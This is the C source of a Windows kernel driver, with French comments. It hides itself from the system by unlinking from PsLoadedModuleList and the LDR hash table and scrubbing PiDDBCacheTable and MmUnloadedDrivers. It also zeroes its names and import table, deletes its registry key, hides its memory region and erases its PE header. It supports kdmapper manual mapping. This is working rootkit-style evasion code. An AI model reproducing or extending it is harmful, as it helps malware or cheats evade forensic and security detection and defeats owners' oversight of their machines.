#include "driver.h"
#include "stealth.h"

static PLDR_DATA_TABLE_ENTRY g_ModuleEntry = NULL;
static PLIST_ENTRY           g_SavedBlink  = NULL;
static BOOLEAN               g_MapperMode  = FALSE;
static PVOID                 g_ImageBase   = NULL;
static ULONG                 g_ImageSize   = 0;

// ---------------------------------------------------------------------------
// FindSelfBase
//
// Scan vers le bas depuis DriverEntry (aligné sur page), cherche MZ + PE valide.
// Compatible Intel et AMD : on cherche dans l'espace d'adressage virtuel noyau,
// indépendamment du CPU. __try/__except absorbe les accès à pages non mappées.
// ---------------------------------------------------------------------------
PVOID FindSelfBase(VOID)
{
    ULONG_PTR addr = (ULONG_PTR)DriverEntry & ~(PAGE_SIZE - 1ULL);

    for (ULONG i = 0; i < 0x200; i++, addr -= PAGE_SIZE) {
        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
            if (dos->e_lfanew <= 0 || dos->e_lfanew >= 0x400) continue;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) return (PVOID)addr;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// HideFromLoadedList — couche 1a : retrait de PsLoadedModuleList
// ---------------------------------------------------------------------------
VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    g_ModuleEntry = entry;
    g_SavedBlink  = entry->InLoadOrderLinks.Blink;
    RemoveEntryList(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);
}

// ---------------------------------------------------------------------------
// ObfuscateLdrEntry — couche 2 : effacement des noms dans LDR
// ---------------------------------------------------------------------------
VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    if (entry->FullDllName.Buffer && entry->FullDllName.Length > 0) {
        RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length        = 0;
        entry->FullDllName.MaximumLength = 0;
        entry->FullDllName.Buffer        = NULL;
    }
    if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
        RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length        = 0;
        entry->BaseDllName.MaximumLength = 0;
        entry->BaseDllName.Buffer        = NULL;
    }
}

// ---------------------------------------------------------------------------
// CleanMmUnloadedDrivers — couche 3 (au déchargement)
// ---------------------------------------------------------------------------
VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
{
    UNICODE_STRING n1 = RTL_CONSTANT_STRING(L"MmUnloadedDrivers");
    UNICODE_STRING n2 = RTL_CONSTANT_STRING(L"MmLastUnloadedDriver");

    PMM_UNLOADED_DRIVER pTable = (PMM_UNLOADED_DRIVER)MmGetSystemRoutineAddress(&n1);
    PULONG              pLast  = (PULONG)MmGetSystemRoutineAddress(&n2);
    if (!pTable || !pLast) return;

    PVOID imageEnd = (PVOID)((ULONG_PTR)ImageBase + ImageSize);
    for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
        if (pTable[i].ModuleStart < ImageBase ||
            pTable[i].ModuleStart >= imageEnd) continue;
        if (pTable[i].Name.Buffer) {
            RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
            pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
            pTable[i].Name.Buffer = NULL;
        }
        pTable[i].ModuleStart = pTable[i].ModuleEnd = NULL;
        pTable[i].UnloadTime  = 0;
    }
}

// ---------------------------------------------------------------------------
// RestoreSelf — ré-insertion dans PsLoadedModuleList avant déchargement
// (obligatoire en mode sc pour éviter un BSOD)
// ---------------------------------------------------------------------------
VOID RestoreSelf(VOID)
{
    if (!g_ModuleEntry || !g_SavedBlink) return;

    g_ModuleEntry->InLoadOrderLinks.Flink = g_SavedBlink->Flink;
    g_ModuleEntry->InLoadOrderLinks.Blink = g_SavedBlink;
    g_SavedBlink->Flink->Blink = &g_ModuleEntry->InLoadOrderLinks;
    g_SavedBlink->Flink        = &g_ModuleEntry->InLoadOrderLinks;
    g_ModuleEntry = NULL;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    if (!g_MapperMode) {
        CleanMmUnloadedDrivers(DriverObject->DriverStart, DriverObject->DriverSize);
        RestoreSelf();
    }
}

// ---------------------------------------------------------------------------
// DriverEntry
//
// ORDRE DES OPÉRATIONS (chaque étape suppose que la précédente est faite) :
//
//  Mode sc/NtLoadDriver (DriverObject valide) :
//    1  FindSelfBase          — localise notre base PE
//    2  HideFromLoadedList    — couche 1a : retire de PsLoadedModuleList
//    3  CleanHashLinks        — couche 1b : retire de la LDR hash-table
//    4  CleanPiDDBCache       — couche 1c : retire de PiDDBCacheTable
//                               (LIT TimeDateStamp → avant ErasePeHeaderPhys)
//    5  ZeroImportTable       — couche 1d : zeroise descripteurs d'imports
//                               (LIT DataDirectory → avant ErasePeHeaderPhys)
//    6  ObfuscateLdrEntry     — couche 2  : zeroise noms dans LDR
//    7  ZeroLdrFields         — couche 2b : zeroise champs DllBase etc.
//    8  CleanRegistryEntry    — couche 5  : supprime clé registre service
//    9  HideVadRegion         — couche 6  : camouflage dans EPROCESS.VadRoot
//   10  ErasePeHeaderPhys     — couche 4  : DERNIER — détruit le PE header
//
//  Mode kdmapper (DriverObject == NULL) :
//    Aucune liste touchée par le loader → étapes 2-8 inutiles.
//    Étapes 9 et 10 appliquées (VAD + PE header effacement).
//
// ---------------------------------------------------------------------------
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    g_ImageBase = FindSelfBase();

    if (DriverObject && DriverObject->DriverSection) {
        // ---- Mode sc / NtLoadDriver ----
        g_MapperMode = FALSE;
        g_ImageSize  = DriverObject->DriverSize;
        DriverObject->DriverUnload = DriverUnload;

        PLDR_DATA_TABLE_ENTRY ldr =
            (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

        HideFromLoadedList(DriverObject);      // 2
        CleanHashLinks(ldr);                   // 3
        if (g_ImageBase) {
            CleanPiDDBCache(g_ImageBase);      // 4 — lit PE header
            ZeroImportTable(g_ImageBase);      // 5 — lit DataDirectory
        }
        ObfuscateLdrEntry(DriverObject);       // 6
        ZeroLdrFields(ldr);                    // 7
        CleanRegistryEntry(RegistryPath);      // 8

    } else {
        // ---- Mode kdmapper ----
        // PsLoadedModuleList, registre, PiDDBCacheTable : non touchés.
        g_MapperMode = TRUE;
    }

    // Couches finales — valides pour les deux modes
    if (g_ImageBase) {
        HideVadRegion(g_ImageBase);            // 9
        ErasePeHeaderPhys(g_ImageBase);        // 10 — EN DERNIER
    }

    return STATUS_SUCCESS;
}
